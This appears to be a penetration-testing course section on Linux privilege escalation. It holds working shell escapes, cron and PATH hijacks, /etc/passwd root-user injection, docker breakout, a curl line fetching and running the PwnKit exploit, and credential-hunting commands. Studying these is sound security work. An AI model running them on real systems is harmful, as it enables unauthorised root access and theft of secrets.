# 04 — Privilege Escalation: Core Concepts & Attacker Thinking

> You have a shell. You're a low-privilege user. Now what? This section is about going from user to root.

---

## 🔴 The Privilege Escalation Mindset

```
Initial Shell (www-data, user)
  │
  ├─→ Who am I? What can I access?
  ├─→ What's running? What's listening?
  ├─→ What can I write? What can I execute?
  ├─→ What's misconfigured?
  └─→ Root
```

### 🧠 Attacker Thinking: Why PrivEsc Matters

Getting a low-privilege shell is just the beginning. You need root to:
- Access all files (including `/etc/shadow`, SSH keys, database configs)
- Install persistence mechanisms
- Pivot to other systems
- Demonstrate full compromise in your report

---

## 🔴 Linux Privilege Escalation Vectors

### 1. SUID/SGID Binaries

SUID (Set User ID) binaries execute with the file owner's permissions. If a binary is owned by root and has the SUID bit set, it runs as root regardless of who executes it.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
```

**Commonly exploitable SUID binaries:**

| Binary | Exploit |
|--------|---------|
| `find` | `find . -exec /bin/sh -p \;` |
| `vim` | `vim -c ':!sh'` |
| `nmap` (old) | `nmap --interactive` then `!sh` |
| `bash` | `bash -p` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `less` | `less /etc/passwd` then `!sh` |
| `env` | `env /bin/sh -p` |
| `cp` | Copy /etc/passwd, add root user, copy back |
| `wget` | Download modified /etc/passwd, overwrite |

**Check GTFOBins**: https://gtfobins.github.io/ — the ultimate reference for SUID/sudo escalation.

### 2. Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Common exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim    → sudo vim -c ':!sh'
# (ALL) NOPASSWD: /usr/bin/find   → sudo find / -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/env    → sudo env /bin/sh
# (ALL) NOPASSWD: /usr/bin/awk    → sudo awk 'BEGIN {system("/bin/sh")}'
# (ALL) NOPASSWD: /usr/bin/python → sudo python -c 'import os;os.system("/bin/sh")'
# (ALL) NOPASSWD: /usr/bin/less   → sudo less /etc/shadow → !sh
# (ALL) NOPASSWD: /usr/bin/man    → sudo man man → !sh
# (ALL) NOPASSWD: /usr/bin/ftp    → sudo ftp → !sh
# (ALL) NOPASSWD: /usr/bin/nmap   → echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse

# Sudo version exploit (CVE-2021-3156 — Baron Samedit)
sudo --version  # If < 1.9.5p2, may be vulnerable
sudoedit -s '\' 'test'  # If crashes → vulnerable
```

### 3. Cron Jobs

```bash
# Check system cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Check user crons
ls -la /var/spool/cron/crontabs/

# Look for writable scripts executed by cron
cat /etc/crontab | grep -v "^#" | awk '{print $7}' | while read script; do
  if [ -w "$script" ] 2>/dev/null; then
    echo "[!] WRITABLE CRON SCRIPT: $script"
  fi
done

# Watch for new processes (cron jobs running)
# Run pspy (process spy) to see what runs:
# Download from: https://github.com/DominicBreuker/pspy
./pspy64

# Exploit: If a cron runs /opt/backup.sh as root and you can write to it:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh
# Wait for cron to execute, then:
/tmp/rootbash -p
```

### 4. PATH Hijacking

If a script or binary uses a command without its full path, you can hijack it.

```bash
# Example: A cron job runs: /opt/scripts/backup.sh
# Content of backup.sh:
#!/bin/bash
tar czf /tmp/backup.tar.gz /home/user/

# "tar" is called without full path (/usr/bin/tar)
# If you control the PATH:

echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH

# Now when backup.sh runs, it executes YOUR "tar" instead
# Which gives you a root shell

# Check current PATH
echo $PATH

# Look for scripts that use relative paths
grep -r "^[a-zA-Z]" /opt/ /usr/local/ --include="*.sh" 2>/dev/null | grep -v "^/"
```

### 5. Writable Files & Directories

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# World-writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# Files owned by current user
find / -user $(whoami) -type f 2>/dev/null

# Critical writable files:
# /etc/passwd → Add a root user
# /etc/shadow → Replace root password hash
# /etc/sudoers → Add sudo privileges
# /etc/crontab → Add a cron job
# /root/.ssh/authorized_keys → Add your SSH key
# Any script run by root → Inject commands

# Adding a root user via writable /etc/passwd
openssl passwd -1 -salt xyz password123
# Output: $1$xyz$...
echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # password: password123 → root!
```

### 6. Kernel Exploits

```bash
# Check kernel version
uname -a
cat /proc/version

# Search for kernel exploits
searchsploit "linux kernel $(uname -r | cut -d. -f1,2)"

# Famous kernel exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8+
# DirtyCow (CVE-2016-5195) — Linux 2.6.22 - 4.8.3
# PwnKit (CVE-2021-4034) — Polkit (almost all Linux distros)
# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2

# PwnKit (very reliable, works on most systems)
# Download from: https://github.com/ly4k/PwnKit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit
./PwnKit  # Instant root
```

### 7. Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid → Can change UID (become root)
# python3 = cap_setuid+ep → python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# perl = cap_setuid+ep → perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh"'

# cap_net_raw → Can sniff network traffic
# cap_dac_read_search → Can read any file
# cap_dac_override → Can write any file
```

### 8. Docker Breakout

```bash
# Are we in a Docker container?
ls /.dockerenv 2>/dev/null && echo "IN DOCKER" || echo "NOT IN DOCKER"
cat /proc/1/cgroup | grep docker

# Docker socket exposed
ls -la /var/run/docker.sock
# If writable → You can create a new container with host root access:
docker run -v /:/host -it ubuntu chroot /host /bin/bash

# Docker group membership
id | grep docker
# If in docker group → Same as root:
docker run -v /:/host -it ubuntu chroot /host /bin/bash
```

---

## 🔴 Enumeration Checklist

```bash
# === SYSTEM INFO ===
hostname
uname -a
cat /etc/os-release
arch

# === USER INFO ===
id
whoami
groups
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/group
sudo -l
last
w

# === NETWORK INFO ===
ifconfig || ip a
netstat -tulpn || ss -tulpn
route || ip route
cat /etc/hosts
cat /etc/resolv.conf
arp -a

# === RUNNING PROCESSES ===
ps aux
ps aux | grep root

# === SERVICES ===
systemctl list-units --type=service --state=running
cat /etc/services

# === CRON ===
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# === SUID/SGID ===
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# === CAPABILITIES ===
getcap -r / 2>/dev/null

# === WRITABLE FILES/DIRS ===
find / -writable -type f 2>/dev/null | head -50
find / -writable -type d 2>/dev/null | head -20

# === SENSITIVE FILES ===
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | head -30
find / -name "*.bak" -o -name "*.old" -o -name "*.save" 2>/dev/null
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
find / -name ".env" 2>/dev/null

# === HISTORY ===
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history 2>/dev/null

# === PASSWORDS ===
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
```

---

## 🔴 Common Mistakes

1. **Running kernel exploits first**: Always check for low-hanging fruit (SUID, sudo, cron) before risking system stability with kernel exploits
2. **Not checking sudo -l**: This is the #1 quickest path to root
3. **Ignoring internal services**: A MySQL running as root on localhost with default creds = root
4. **Not looking at running processes**: A process running as root might load a config file you can write to
5. **Missing writable scripts**: If root's cron runs `/opt/script.sh` and you can write to it, game over
6. **Forgetting /etc/passwd**: If it's writable, you can add a root user in seconds

---

## 🧠 If You're Stuck

1. Run linpeas or LinEnum and read EVERY line of output
2. Check `sudo -l` again — did you miss something?
3. Monitor processes with `pspy` — cron jobs might not be in crontab
4. Look at internal services: `ss -tulpn` — what's listening on localhost only?
5. Check for Docker: `id | grep docker` or `ls /.dockerenv`
6. Search for passwords: `grep -rn "password\|pass\|pwd" /var/www/ /opt/ /home/ 2>/dev/null`
7. Check kernel version against known exploits
